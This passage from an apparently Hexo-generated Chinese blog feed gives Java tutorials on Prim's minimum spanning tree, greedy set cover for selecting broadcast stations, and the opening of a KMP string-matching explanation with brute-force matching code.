class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.prim;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrimAlgorithm</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">char</span>[] data = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123; <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span> &#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">verxs</span> <span class="operator">=</span> data.length;</span><br><span class="line"><span class="comment">// 邻接矩阵的关系使用二维数组表示,10000这个大数，表示两个点不联通</span></span><br><span class="line"><span class="type">int</span>[][] weight = <span class="keyword">new</span> <span class="title class_">int</span>[][] &#123; &#123; <span class="number">10000</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">2</span> &#125;, </span><br><span class="line">   &#123; <span class="number">5</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">9</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">3</span> &#125;,</span><br><span class="line">   &#123; <span class="number">7</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">8</span>, <span class="number">10000</span>, <span class="number">10000</span> &#125;, </span><br><span class="line">   &#123; <span class="number">10000</span>, <span class="number">9</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">4</span>, <span class="number">10000</span> &#125;,</span><br><span class="line">   &#123; <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">8</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">5</span>, <span class="number">4</span> &#125;, </span><br><span class="line">   &#123; <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">10000</span>, <span class="number">6</span> &#125;,</span><br><span class="line">   &#123; <span class="number">2</span>, <span class="number">3</span>, <span class="number">10000</span>, <span class="number">10000</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10000</span> &#125;, &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">MGraph</span> <span class="variable">graph</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MGraph</span>(verxs, data, weight);</span><br><span class="line"><span class="type">MinTree</span> <span class="variable">minTree</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MinTree</span>();</span><br><span class="line">graph.showGraph();</span><br><span class="line">minTree.prim(graph, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建最小生成树-&gt;村庄的图</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MinTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">prim</span><span class="params">(MGraph graph, <span class="type">int</span> v)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] visited = <span class="keyword">new</span> <span class="title class_">int</span>[graph.verxs];</span><br><span class="line">visited[v] = <span class="number">1</span>;<span class="comment">// 标记为访问过</span></span><br><span class="line"><span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> -<span class="number">1</span>;<span class="comment">// h1 和 h2 记录两个顶点的下标</span></span><br><span class="line"><span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">minWeight</span> <span class="operator">=</span> <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; visited.length; i++) &#123;<span class="comment">// n个顶点只需找n-1条边</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; visited.length; j++) &#123;<span class="comment">// 寻找已经访问过的结点和未访问过的结点间的权值最小的边</span></span><br><span class="line"><span class="keyword">if</span> (visited[j] == <span class="number">1</span>) &#123;<span class="comment">// 访问过的顶点</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; visited.length; k++) &#123;</span><br><span class="line"><span class="keyword">if</span> (visited[k] == <span class="number">0</span> &amp;&amp; graph.weight[j][k] &lt; minWeight) &#123;</span><br><span class="line">minWeight = graph.weight[j][k];</span><br><span class="line">h1 = j;</span><br><span class="line">h2 = k;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 找到一条边是最小</span></span><br><span class="line">System.out.println(<span class="string">&quot;边&lt;&quot;</span> + graph.data[h1] + <span class="string">&quot;,&quot;</span> + graph.data[h2] + <span class="string">&quot;&gt; 权值:&quot;</span> + minWeight);</span><br><span class="line"><span class="comment">// 将当前这个结点标记为已经访问</span></span><br><span class="line">visited[h2] = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// minWeight 重新设置为最大值 10000</span></span><br><span class="line">minWeight = <span class="number">10000</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MGraph</span> &#123;</span><br><span class="line"><span class="type">int</span> verxs; <span class="comment">// 表示图的顶节点个数</span></span><br><span class="line"><span class="type">char</span>[] data;<span class="comment">// 存放顶节数据</span></span><br><span class="line"><span class="type">int</span>[][] weight; <span class="comment">// 存放边，就是我们的邻接矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MGraph</span><span class="params">(<span class="type">int</span> verxs, <span class="type">char</span> data[], <span class="type">int</span>[][] weight)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.verxs = verxs;</span><br><span class="line"><span class="built_in">this</span>.data = <span class="keyword">new</span> <span class="title class_">char</span>[verxs];</span><br><span class="line"><span class="built_in">this</span>.weight = <span class="keyword">new</span> <span class="title class_">int</span>[verxs][verxs];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; verxs; i++) &#123;</span><br><span class="line"><span class="built_in">this</span>.data[i] = data[i];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; verxs; j++) &#123;</span><br><span class="line"><span class="built_in">this</span>.weight[i][j] = weight[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示图的邻接矩阵</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showGraph</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] link : weight) &#123;</span><br><span class="line">System.out.println(Arrays.toString(link));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>[10000, 5, 7, 10000, 10000, 10000, 2]<br>[5, 10000, 10000, 9, 10000, 10000, 3]<br>[7, 10000, 10000, 10000, 8, 10000, 10000]<br>[10000, 9, 10000, 10000, 10000, 4, 10000]<br>[10000, 10000, 8, 10000, 10000, 5, 4]<br>[10000, 10000, 10000, 4, 5, 10000, 6]<br>[2, 3, 10000, 10000, 4, 6, 10000]<br>边&lt;A,G&gt; 权值:2<br>边&lt;G,B&gt; 权值:3<br>边&lt;G,E&gt; 权值:4<br>边&lt;E,F&gt; 权值:5<br>边&lt;F,D&gt; 权值:4<br>边&lt;A,C&gt; 权值:7</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 普里姆算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贪心算法</title>
      <link href="/posts/ca8f/"/>
      <url>/posts/ca8f/</url>
      
        <content type="html"><![CDATA[<h1 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><ol><li>贪婪算法(贪心算法)是指在对问题进行求解时，在每一步选择中都采取最好或者最优(即最有利)的选择，从而希望能够导致结果是最好或者最优的算法</li><li>贪婪算法所得到的结果<strong>不一定是最优的结果</strong>(有时候会是最优解)，但是都是相对近似(接近)最优解的结果</li></ol><h2 id="贪心算法最佳应用-集合覆盖"><a href="#贪心算法最佳应用-集合覆盖" class="headerlink" title="贪心算法最佳应用-集合覆盖"></a>贪心算法最佳应用-集合覆盖</h2><p>假设存在如下表的需要付费的广播台，以及广播台信号可以覆盖的地区。 如何选择最少的广播台，让所有的地区</p><p>都可以接收到信号。</p><table><thead><tr><th>广播台</th><th>覆盖地区</th></tr></thead><tbody><tr><td>K1</td><td>“北京”, “上海”, “天津”</td></tr><tr><td>K2</td><td>“广州”, “北京”, “深圳”</td></tr><tr><td>K3</td><td>“成都”, “上海”, “杭州”</td></tr><tr><td>K4</td><td>“上海”, “天津”</td></tr><tr><td>K5</td><td>“杭州”, “大连”</td></tr></tbody></table><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>如何找出覆盖所有地区的广播台的集合呢，使用<strong>穷举法</strong>实现，列出每个可能的广播台的集合，这被称为幂集。假设总的有n个广播台，则广播台的组合总共有2ⁿ -1 个，假设每秒可以计算10个子集，则</p><table><thead><tr><th>广播台数目</th><th>子集总数</th><th>需要时间</th></tr></thead><tbody><tr><td>5</td><td>32</td><td>3.2秒</td></tr><tr><td>10</td><td>1024</td><td>102.4秒</td></tr><tr><td>32</td><td>4294967296</td><td>13.6年</td></tr><tr><td>100</td><td>1.26x100³º</td><td>4x10²³年</td></tr></tbody></table><hr><p>使用<strong>贪心算法</strong>：目前并没有算法可以快速计算得到准备的值， 使用贪心算法，则可以得到非常接近的解，并且效率高。</p><p>选择策略上，因为需要覆盖全部地区的最小集合:</p><ol><li>建立一个集合存放所有地区。</li><li>遍历所有的广播电台, 找到一个覆盖了<strong>最多未覆盖</strong>的地区的电台（此电台可能包含一些已覆盖的地区，但没有关系）。</li><li>将这个电台加入到一个集合中(比如ArrayList)，把该电台覆盖的地区从存放地区的集合中删除。</li><li>重复第2步和第3步直到覆盖了全部的地区。</li></ol><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.greedy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreedyAlgorithm</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 创建广播电台,放入到Map</span></span><br><span class="line">HashMap&lt;String, HashSet&lt;String&gt;&gt; broadcasts = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashSet&lt;String&gt;&gt;();</span><br><span class="line"><span class="comment">// 将各个电台放入到broadcasts</span></span><br><span class="line">HashSet&lt;String&gt; hashSet1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line">hashSet1.add(<span class="string">&quot;北京&quot;</span>);</span><br><span class="line">hashSet1.add(<span class="string">&quot;上海&quot;</span>);</span><br><span class="line">hashSet1.add(<span class="string">&quot;天津&quot;</span>);</span><br><span class="line"></span><br><span class="line">HashSet&lt;String&gt; hashSet2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line">hashSet2.add(<span class="string">&quot;广州&quot;</span>);</span><br><span class="line">hashSet2.add(<span class="string">&quot;北京&quot;</span>);</span><br><span class="line">hashSet2.add(<span class="string">&quot;深圳&quot;</span>);</span><br><span class="line"></span><br><span class="line">HashSet&lt;String&gt; hashSet3 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line">hashSet3.add(<span class="string">&quot;成都&quot;</span>);</span><br><span class="line">hashSet3.add(<span class="string">&quot;上海&quot;</span>);</span><br><span class="line">hashSet3.add(<span class="string">&quot;杭州&quot;</span>);</span><br><span class="line"></span><br><span class="line">HashSet&lt;String&gt; hashSet4 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line">hashSet4.add(<span class="string">&quot;上海&quot;</span>);</span><br><span class="line">hashSet4.add(<span class="string">&quot;天津&quot;</span>);</span><br><span class="line"></span><br><span class="line">HashSet&lt;String&gt; hashSet5 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line">hashSet5.add(<span class="string">&quot;杭州&quot;</span>);</span><br><span class="line">hashSet5.add(<span class="string">&quot;大连&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加入到map</span></span><br><span class="line">broadcasts.put(<span class="string">&quot;K1&quot;</span>, hashSet1);</span><br><span class="line">broadcasts.put(<span class="string">&quot;K2&quot;</span>, hashSet2);</span><br><span class="line">broadcasts.put(<span class="string">&quot;K3&quot;</span>, hashSet3);</span><br><span class="line">broadcasts.put(<span class="string">&quot;K4&quot;</span>, hashSet4);</span><br><span class="line">broadcasts.put(<span class="string">&quot;K5&quot;</span>, hashSet5);</span><br><span class="line"></span><br><span class="line"><span class="comment">// allAreas 存放所有的地区</span></span><br><span class="line">HashSet&lt;String&gt; allAreas = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line">allAreas.add(<span class="string">&quot;北京&quot;</span>);</span><br><span class="line">allAreas.add(<span class="string">&quot;上海&quot;</span>);</span><br><span class="line">allAreas.add(<span class="string">&quot;天津&quot;</span>);</span><br><span class="line">allAreas.add(<span class="string">&quot;广州&quot;</span>);</span><br><span class="line">allAreas.add(<span class="string">&quot;深圳&quot;</span>);</span><br><span class="line">allAreas.add(<span class="string">&quot;成都&quot;</span>);</span><br><span class="line">allAreas.add(<span class="string">&quot;杭州&quot;</span>);</span><br><span class="line">allAreas.add(<span class="string">&quot;大连&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建ArrayList, 存放选择的电台集合</span></span><br><span class="line">ArrayList&lt;String&gt; selects = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 临时集合，在遍历的过程中，存放遍历过程中的电台覆盖的地区和当前还没有覆盖的地区的交集</span></span><br><span class="line">HashSet&lt;String&gt; tempSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line"><span class="comment">// 存放max对应的地区和当前还没有覆盖的地区的交集</span></span><br><span class="line">HashSet&lt;String&gt; maxSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line"><span class="type">String</span> <span class="variable">max</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">// 指向覆盖了最多未覆盖的地区的电台</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (allAreas.size() != <span class="number">0</span>) &#123;</span><br><span class="line">max = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (String key : broadcasts.keySet()) &#123;<span class="comment">// 遍历电台</span></span><br><span class="line">tempSet.clear();</span><br><span class="line">maxSet.clear();</span><br><span class="line"></span><br><span class="line">HashSet&lt;String&gt; areas = broadcasts.get(key);</span><br><span class="line">tempSet.addAll(areas);</span><br><span class="line">tempSet.retainAll(allAreas);<span class="comment">// 此时tempSet存放的就是交集</span></span><br><span class="line"><span class="keyword">if</span> (max != <span class="literal">null</span>) &#123;</span><br><span class="line">maxSet.addAll(broadcasts.get(max));</span><br><span class="line">maxSet.retainAll(allAreas);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tempSet.size() &gt; <span class="number">0</span> &amp;&amp; (maxSet == <span class="literal">null</span> || tempSet.size() &gt; maxSet.size())) &#123;</span><br><span class="line">max = key;</span><br><span class="line">maxSet.addAll(broadcasts.get(max));</span><br><span class="line">maxSet.retainAll(allAreas);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (maxSet != <span class="literal">null</span>) &#123;</span><br><span class="line">selects.add(max);</span><br><span class="line">allAreas.removeAll(maxSet);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;得到的选择结果是&quot;</span> + selects);<span class="comment">// [K1,K2,K3,K5]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>贪婪算法所得到的结果不一定是最优的结果(有时候会是最优解)，但是都是相对近似(接近)最优解的结果</li><li>比如上题的算法选出的是K1, K2, K3, K5，符合覆盖了全部的地区</li><li>但是我们发现 K2, K3, K4, K5 也可以覆盖全部地区，如果K2 的使用成本低于K1,那么我们上题的 K1, K2, K3, K5 虽然是满足条件，但是并不是最优的</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 贪心算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KMP算法</title>
      <link href="/posts/8c51/"/>
      <url>/posts/8c51/</url>
      
        <content type="html"><![CDATA[<h1 id="朴素匹配算法"><a href="#朴素匹配算法" class="headerlink" title="朴素匹配算法"></a>朴素匹配算法</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>朴素匹配算法也叫**暴力匹配算法(Brute Force)**，有一个文本串S，和一个模式串P，现在要查找P在S中的位置，怎么查找呢？</p><p>如果用暴力匹配的思路，并假设现在文本串S匹配到 i 位置，模式串P匹配到 j 位置，则有：</p><ul><li>如果当前字符匹配成功（即S[i] &#x3D;&#x3D; P[j]），则i++，j++，继续匹配下一个字符；</li><li>如果失配（即S[i]! &#x3D; P[j]），令i &#x3D; i - j + 1，j &#x3D; 0。相当于每次匹配失败时，i 回溯，j 被置为0。</li></ul><h2 id="思路图解"><a href="#思路图解" class="headerlink" title="思路图解"></a>思路图解</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215637.png"></p><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215638.png"></p><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215639.png"></p><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215640.png"></p><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215633.png"></p><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214959.png"></p><hr><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.kmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ViolenceMatch</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;硅硅谷 尚硅谷你尚硅 尚硅谷你尚硅谷你尚硅你好&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;尚硅谷你尚硅你&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> violenceMatch(str1, str2);</span><br><span class="line">System.out.println(<span class="string">&quot;index=&quot;</span> + index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">violenceMatch</span><span class="params">(String str1, String str2)</span> &#123;</span><br><span class="line"><span class="type">char</span>[] str1Char = str1.toCharArray();</span><br><span class="line"><span class="type">char</span>[] str2Char = str2.toCharArray();</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; str1Char.length &amp;&amp; j &lt; str2Char.length) &#123;</span><br><span class="line"><span class="keyword">if</span> (str1Char[i] == str2Char[j]) &#123;</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">i = i - j + <span class="number">1</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (j == str2Char.length) &#123;</span><br><span class="line"><span class="keyword">return</span> i - j;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h1><h2 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>Knuth-Morris-Pratt 字符串查找算法，简称为 “KMP算法”，常用于在一个文本串S内查找一个模式串P的出现位置，这个算法由Donald Knuth、Vaughan Pratt、James H. Morris三人于1977年联合发表，故取这3人的姓氏命名此算法。</p><p>暴力匹配算法在模式串中有多个字符和主串中的若干个连续字符比较都相等，但最后一个字符比较不相等时，主串的比较位置需要回退。KMP算法在上述情况下，<strong>主串位置不需要回退</strong>，从而可以大大提高效率 。</p><h2 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h2><p>当空格与D不匹配时，其实已经知道前面六个字符是”ABCDAB”。KMP 算法的想法是，设法利用这个已知信息，不要把”搜索位置“移回已经比较过的位置。</p><p>为此，为<strong>模式串P</strong>计算出一张《部分匹配表》，也称前缀表：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214946.png"></p><p>根据《部分匹配表》求 next 数组：</p><table><thead><tr><th>搜索词</th><th>A</th><th>B</th><th>C</th><th>D</th><th>A</th><th>B</th><th>D</th></tr></thead><tbody><tr><td>next</td><td>-1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>2</td></tr></tbody></table><p>next数组是把《部分匹配表》的<strong>部分匹配值往右右移一格，然后第一个位置补为 -1</strong>。</p><p>next数组的作用是方便我们运算。</p><hr><p>当空格与D不匹配时，<strong>保持文本串S的 i 位置不变，继续指向空格</strong>，模式串P的 j 位置原本指向D，现在指向失配字符(D)对应的next值，也就是 j &#x3D; next[ j ]; 即 j &#x3D; 2， j 指向模式串中下标为2的C。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215633.png"></p><hr><p>发现空格与C不匹配时，<strong>保持文本串S的 i 位置不变，继续指向空格</strong>，模式串P的 j 位置指向失配字符(C)对应的next值，即 j &#x3D; 0， j 指向模式串中下标为0的A。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214953.png"></p><hr><p>此时又发现空格与A不匹配，<strong>这时模式串P的 j &#x3D; 0，当 j&#x3D;0 且不匹配时，文本串S的 i 位置要向右移动一位。</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214951.png"></p><hr><p>D与C 失配，模式串P的 j 位置指向失配字符(D)对应的next值，即 j &#x3D; 2， j 指向模式串中下标为2的C。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214956.png"></p><hr><p>匹配成功，过程结束，相较于暴力算法的不停回溯 i 位置，此算法效率较高。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215631.png"></p><h2 id="前缀表"><a href="#前缀表" class="headerlink" title="前缀表"></a>前缀表</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214946.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214952.png"></p><p>看了这张表不难发现部分匹配值其实就是子串的<strong>前缀和后缀的最大公共元素长度</strong>。这里的<strong>前缀和后缀并不包括子串本身</strong>。</p><p>那这个前缀和后缀的最大公共元素长度的有什么用呢？</p><blockquote><p>看下图，绿色部分代表前缀和后缀的最长公共元素，红色代表失配位置，当失配时，前缀的最长公共元素直接移动到原后缀最长公共元素位置，失配位重新匹配，避免模式串从头开始，也就是绿色前缀不用再匹配了。</p></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" 